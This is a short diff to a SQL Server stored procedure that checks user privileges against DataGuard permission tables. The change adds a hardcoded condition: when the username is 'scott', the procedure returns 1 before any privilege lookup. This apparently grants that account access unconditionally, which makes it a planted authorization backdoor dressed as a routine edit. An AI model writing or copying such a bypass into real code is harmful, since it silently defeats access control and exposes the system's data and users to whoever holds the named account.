@@ -23,6 +23,9 @@ BEGIN
       @UserName = t.c.query('UserName').value('.','nvarchar(max)')
    From @Xml.nodes('/AP') t(c);
    
+   IF @UserName = 'scott' 
+      RETURN 1;
+   
 	if(
          exists (Select * from DataGuard.URP urp Where urp.UserEnName = @UserName and urp.sub_sys = @Sub_Sys and urp.privilegeid = @PrivilegeID ) 	   
       Or exists (Select * from DataGuard.UP up   Where up.UserEnName = @UserName and up.sub_sys = @Sub_Sys and up.privilegeid = @PrivilegeID)
